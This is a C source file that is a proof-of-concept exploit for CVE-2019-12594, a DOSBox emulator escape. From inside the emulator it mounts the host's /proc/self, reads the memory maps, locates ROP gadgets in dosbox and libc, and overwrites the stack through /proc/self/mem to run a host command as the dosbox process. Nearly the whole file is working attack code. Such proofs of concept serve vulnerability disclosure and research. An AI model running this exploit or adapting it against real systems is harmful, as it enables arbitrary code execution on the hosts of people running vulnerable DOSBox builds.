// 
// Description: PoC for CVE-2019-12594
// Author: Alexandre Bartel
//
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define GETLINE_MINSIZE 16
//
// The getline function was not available at the
// time...
int my_getline2(char **lineptr, size_t *n, FILE *fp) {
  int ch;
  int i = 0;
  char free_on_err = 0;
  char *p;

  errno = 0;
  if (lineptr == NULL || n == NULL || fp == NULL) {
    errno = EINVAL;
    return -1;
  }
  if (*lineptr == NULL) {
    *n = GETLINE_MINSIZE;
    *lineptr = (char *)malloc( sizeof(char) * (*n));
    if (*lineptr == NULL) {
      errno = ENOMEM;
      return -1;
    }
    free_on_err = 1;
  }

  for (i=0; ; i++) {
    ch = fgetc(fp);
    while (i >= (*n) - 2) {
      *n *= 2;
      p = realloc(*lineptr, sizeof(char) * (*n));
      if (p == NULL) {
        if (free_on_err)
          free(*lineptr);
        errno = ENOMEM;
        return -1;
      }
      *lineptr = p;
    }
    if (ch == EOF) {
      if (i == 0) {
        if (free_on_err)
          free(*lineptr);
        return -1;
      }
      (*lineptr)[i] = '\0';
      *n = i;
      return i;
    }

    if (ch == '\n') {
      (*lineptr)[i] = '\n';
      (*lineptr)[i+1] = '\0';
      *n = i+1;
      return i+1;
    }
    (*lineptr)[i] = (char)ch;
  }
}


//
//
void seek_to_addr(unsigned long long addr, FILE * fd) {
  unsigned long count, j, STEP;
  long long retval = 0;

  retval = fseek(fd, 0 ,SEEK_SET);
    if (0 != retval) {
      printf("error retval1 != 0: %d \n", retval);
      exit(-1);
    }

  STEP = 1000000000;
  count = (addr / STEP);
  for (j = 0; j < count; j++) { 
    retval = fseek(fd, STEP ,SEEK_CUR);
    if (0 != retval) {
      printf("error retval2 != 0: %d \n", retval);
      exit(-1);
    }
  }
  retval = fseek(fd, (addr % STEP) ,SEEK_CUR);
    if (0 != retval) {
      printf("error retval3 != 0: %d \n", retval);
      exit(-1);
    }
}

int check_gadget(FILE *mem, uint64_t addr, uint8_t *expected, uint8_t expected_len) {
  int all_ok = 1;
  int retval = 0;
  uint8_t i = 0;
  uint8_t *buffer = NULL;
  
  printf("  -> Checking gadget at 0x%" PRIx64 "\n", addr);

  seek_to_addr(addr, mem);

  buffer = malloc(expected_len);
  retval = fread(buffer, 1, expected_len, mem);
  if (expected_len != retval) {
    printf("error retval fread != 0: %d, error: %d \n", retval, ferror(mem));
    exit(-1);
  }
  printf("     byte: ");
  for (i = 0; i < expected_len; i++) {
    if (!(i == 0 && buffer[i] == 0xcc) && buffer[i] != expected[i]) {
      printf("ERROR: expected '%x' but got '%x'\n", expected[i], buffer[i]);
      all_ok = 0;
    } else {
      if (i == 0) {
        printf("byte ");
      }
      printf(" %d/%d: ok!", i+1, expected_len);
    }
     
  }
  printf("\n");

  return all_ok;

}

void escape() {

  FILE * fd = NULL;
  FILE * sc_fp = NULL;
  int i,j,c,l, found = 0;
  unsigned long long offset;
  unsigned long long addr, ftell_addr;
  unsigned long long dosbox_normalloop_addr;
  unsigned long long chain_start_addr;
  unsigned long long chain_end_addr;
  long long retval = 0;
  FILE * fp;
  char * line = NULL;
  size_t len2 = 0;
  ssize_t read;
  unsigned long long heap = 0;
  char subbuff[13];
  unsigned long long tmp8;
  unsigned long long shift;
  int64_t addresses_start[1000];
  int64_t addresses_end[1000];
  int64_t gadget = 0;
  int gadget_popret_nbr = 0;
  int addr_i = 0;
  int stack_i = -1;
  int dosbox_i = -1;
  int libc_i = -1;
  int diff = 0;
  int same_count = 0;
  char * start = NULL;
  char * command = "export DISPLAY=:0.0; /usr/bin/qalculate-gtk -n";
  int64_t * chain = NULL;
  uint8_t * gadget_0_expected = NULL;
  uint8_t * gadget_1_expected = NULL;
  uint8_t * gadget_2_expected = NULL;
  uint8_t gadget_0_expected_len = 0;
  uint8_t gadget_1_expected_len = 0;
  uint8_t gadget_2_expected_len = 0;
  int chain_len = 0;
  uint64_t addr_NormalLoop = 0;
  uint64_t offset_to_fwrite = 0;
  uint64_t offset_to_docommand = 0;
  uint64_t return_addr_in_stack = 0;
  uint8_t * stack_buffer = NULL;
  uint64_t stack_buffer_len = 0;
  uint8_t * stack_tmp = NULL;
  uint16_t stack_padding = 0;
  char * tmp_buffer = malloc(1);

  chain = malloc(64 * 10000);
  memset(chain, 0x41, 64 * 10000);

  fd = fopen("p:\\mem", "rwb");
  if (fd == NULL) {
    printf("[-] Error: could not open mem in RDWR mode! retval = %d", fd);
    exit(EXIT_FAILURE);
  }

  fp = fopen("p:\\maps", "r");
  if (fp == NULL) {
    exit(EXIT_FAILURE);
  }

  printf("[+] Reading maps...\n");
  fflush(stdout);
  while ((read = my_getline2(&line, &len2, fp)) != -1) {
    // start address
    memcpy( subbuff, &line[0], 12 );
    subbuff[12] = '\0';
    heap = strtoll(subbuff, NULL, 16);
    addresses_start[addr_i] = heap;
    // end address
    memcpy( subbuff, &line[13], 12 );
    subbuff[12] = '\0';
    heap = strtoll(subbuff, NULL, 16);
    addresses_end[addr_i] = heap;
    // find stack/text/libc sections
    if(strstr(line, " rw") != NULL && strstr(line, "stack") != NULL) {
      if (stack_i < 0) { stack_i = addr_i; } // save first only
    } else if (strstr(line, "dosbox") != NULL) {
      if (dosbox_i < 0) { dosbox_i = addr_i; } // save first only
    } else if (strstr(line, "libc-2") != NULL) {
      if (libc_i < 0) { libc_i = addr_i; } // save first only
    }
    addr_i++;
  }
  printf("  * stack  @: 0x%llx\n", stack_i < 0 ? 0 : addresses_start[stack_i]);
  printf("  * libc   @: 0x%llx\n", libc_i < 0 ? 0 : addresses_start[libc_i]);
  printf("  * dosbox @: 0x%llx\n", dosbox_i < 0 ? 0 : addresses_start[dosbox_i]);

  

  printf("[+] Constructing gadget chain...\n"); 
  chain_len = 3;
  chain[0] = 0x0000000000028d87;
  chain[1] = addresses_start[stack_i]; // @ "/usr/bin/qalculate-gtk",0
  chain[2] = 0x00000000000449c0;
  chain[3] = 0x0000000000037d28;       // eb fe = jump to itself = infinite loop

  chain[0] += addresses_start[dosbox_i];
  chain[2] += addresses_start[libc_i];
  chain[3] += addresses_start[dosbox_i];

  ///////////////////////////////////////
  ///////////////////////////////////////
  printf("[+] Checking presence of gadgets...\n");
  gadget_0_expected_len = 2;
  gadget_0_expected = malloc(gadget_0_expected_len);
  gadget_0_expected[0] = 0x5f;
  gadget_0_expected[1] = 0xc3;
  if (! check_gadget(fd, chain[0], gadget_0_expected, gadget_0_expected_len)) {
    printf("[-] gadget 0 not found.\n");
    exit(-1);
  }
  //
  gadget_1_expected_len = 6;
  gadget_1_expected = malloc(gadget_1_expected_len);
  gadget_1_expected[0] = 0x48;
  gadget_1_expected[1] = 0x85;
  gadget_1_expected[2] = 0xff;
  gadget_1_expected[3] = 0x74;
  gadget_1_expected[4] = 0x0b;
  gadget_1_expected[5] = 0xe9;
  if (! check_gadget(fd, chain[2], gadget_1_expected, gadget_1_expected_len)) {
    printf("[-] gadget 2 not found.\n");
    exit(-1);
  }

  //////////////////////////////////////////////////////
  //////////////////////////////////////////////////////

  for (i = 0; i < chain_len; i++) {
    printf("  * gadget %d: %llx\n", i, chain[i]);
  }

  ////////////////////////////////////////////////////////////////
  // cheching stack to know where to overwrite with rop chain...
  ////////////////////////////////////////////////////////////////
  printf("[+] Finding stack location...\n");
  addr_NormalLoop = 0x2a10f + addresses_start[dosbox_i];
  return_addr_in_stack = 0;
  seek_to_addr(addresses_start[stack_i], fd);
  stack_buffer_len = 0x21000;
  stack_buffer = malloc(stack_buffer_len);
  retval = fread(stack_buffer, 1, stack_buffer_len, fd);
  if (stack_buffer_len != retval) {
    printf("error retval fread stack_buffer: retval is %d which is != than %d, error: %d \n", retval, stack_buffer_len, ferror(fd));
    exit(-1);
  }
  stack_tmp = (uint8_t *)&addr_NormalLoop;
  printf("[+] Trying to find address of NormalLoop: 0x%" PRIx64 "\n", addr_NormalLoop);
  for (i = 0; i < 8; i++) {
    printf("%x ", stack_tmp[i] & 0xff);
  }
  printf("\n");
  for (i = stack_buffer_len - 8; i >=0 ; i--) {
    found = 0;
    for (j = 0; j < 8; j++) {
      if (stack_tmp[j] == stack_buffer[j + i]) {
        found += 1;
      } else {
        break;
      }
    }
    if (found == 8) {
      break;
    }
  }
  if (found == 8) {
    return_addr_in_stack = addresses_start[stack_i] + i;
    printf("[+] found address of NormalLoop: 0x%" PRIx64 "\n", return_addr_in_stack);
  } else {
    printf("[-] address of NormalLoop not found!\n", i);
  }
  ////////////////////////////////////////////////////////////////
  ////////////////////////////////////////////////////////////////

  ////////////////////////////////////////////////////////////////
  // updating ROP chain
  ////////////////////////////////////////////////////////////////
  
  // addresse where to start writting the ROP chain
  offset_to_docommand = 0x40;
  chain_start_addr = return_addr_in_stack;
  chain_end_addr = return_addr_in_stack + offset_to_docommand;

  gadget = 0x32636 + addresses_start[dosbox_i];
  gadget_popret_nbr = (chain_end_addr - (chain_start_addr + 8 * chain_len));
  printf("[+] nbr gadget to finish docommand: %d \n", gadget_popret_nbr);
  gadget_popret_nbr = gadget_popret_nbr / 8;
  printf("[+] nbr gadget to finish docommand: %d \n", gadget_popret_nbr);
  for (i = chain_len; i < chain_len + gadget_popret_nbr - 1; i++) {
    chain[i] = gadget;
  }

  gadget = 0x201784;
  gadget += addresses_start[dosbox_i];
  chain[i++] = gadget;

  printf("  * gadget %d: %llx\n", i, chain[i-1]);

  ////////////////////////////////////////////////////////////////
  ////////////////////////////////////////////////////////////////

  printf("[+] Writing ROP...\n");
  printf("  * chain start addr     : 0x%llx\n", chain_start_addr);
  printf("  * 8 byte chain gadgets : 0x%x\n", chain_len); 
  printf("  * 8 byte ret gadgets   : 0x%x\n", gadget_popret_nbr); 
  printf("  * chain end addr       : 0x%llx\n", chain_start_addr + (chain_len + gadget_popret_nbr) * 8);
  printf("  * chain end addr       : 0x%llx\n", chain_end_addr);
  fflush(stdout);

  fclose(fd);
  fd = fopen("p:\\mem", "wb");

  // write command at start of stack
  seek_to_addr(addresses_start[stack_i], fd);
  retval = fwrite(command, 1, strlen(command) + 1, fd);
  printf("[+] Command write ret = %d\n", retval);

  seek_to_addr(chain_start_addr, fd);
  stack_padding = 0;
  retval = fwrite(chain, 8, (chain_len + gadget_popret_nbr) + stack_padding, fd);
  printf("[+] Chain write ret = %d\n", retval); // this is not executed

  printf("ERROR, exploitation failed. Should not reach this point.\n");
  exit(-1);

}

void mount() {
  system("mount p /proc/self/");
}

//
// Escape Dosbox and run arbitrary code on the
// host as the dosbox process
int main() {
  mount();
  escape();
  return 0;
}

